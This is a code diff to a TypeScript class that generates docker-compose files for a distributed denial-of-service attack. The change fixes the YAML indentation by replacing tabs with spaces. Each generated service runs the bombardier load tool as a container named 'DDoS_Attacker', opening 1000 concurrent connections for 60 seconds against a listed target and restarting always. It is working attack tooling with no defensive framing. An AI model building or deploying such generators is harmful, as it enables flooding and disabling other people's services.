@@ -2,7 +2,9 @@ import fs from "fs";
 import _ from "lodash";
 
 /**
- * This is used to generate and save file for attack
+ * This is used to generate and save file for attack;
+ *
+ * Tabs are not supported by .yml files
  */
 export class FileGenerator {
     private targets: string[] = [];
@@ -30,11 +32,11 @@ export class FileGenerator {
             fileContent+= "services:\n";
 
             for (let i = 0; i < chunk.length; i++) {
-                fileContent+= `\ts${i}:\n`;
-                fileContent+= "\t\timage: alpine/bombardier\n";
-                fileContent+= `\t\tcontainer_name: \"DDoS_Attacker_${i}\"\n`;
-                fileContent+= `\t\tcommand: [ \"-c\", \"1000\", \"-d\", \"60s\", \"-l\", \"${this.targets[i]}\" ]\n`;
-                fileContent+= "\t\trestart: \"always\"\n";
+                fileContent+= `   s${i}:\n`;
+                fileContent+= "      image: alpine/bombardier\n";
+                fileContent+= `      container_name: \"DDoS_Attacker_${i}\"\n`;
+                fileContent+= `      command: [ \"-c\", \"1000\", \"-d\", \"60s\", \"-l\", \"${this.targets[i]}\" ]\n`;
+                fileContent+= "      restart: \"always\"\n";
             }
 
             console.log('Saving into file: ', filepath);
